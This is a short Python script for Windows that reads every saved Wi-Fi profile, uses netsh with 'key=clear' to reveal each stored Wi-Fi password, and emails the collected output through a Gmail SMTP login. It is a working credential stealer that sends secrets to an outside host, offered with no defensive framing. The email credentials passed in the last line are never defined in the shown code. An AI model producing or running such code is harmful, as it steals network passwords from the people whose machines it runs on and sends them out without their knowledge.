#!/usr/bin/env python3
"""currently supports Windows 10 only"""
import subprocess
import smtplib
import re


def send_email(my_email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(my_email, password)
    # send from my_email to my_email (from, to, message)
    server.sendmail(my_email, my_email, message)
    server.quit()


command = "netsh wlan show profile"
# requires .decode("utf-8") if using python3
networks = subprocess.check_output(command, shell=True).decode("utf-8")
# # find only 1 network profile at a time
# network_names = re.search("(?:Profile\s*:\s)(.*)", networks)
# # prints only the profile name, if group(0) prints the whole string
# print(network_names.group(1))

# find all network profiles and display it as a list
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""

for profile_name in network_names:
    command = "netsh wlan show profile " + profile_name + " key=clear"
    # requires .decode("utf-8") if using python3
    current_result = subprocess.check_output(command, shell=True).decode("utf-8")
    result += current_result

send_email(my_email, password, result)
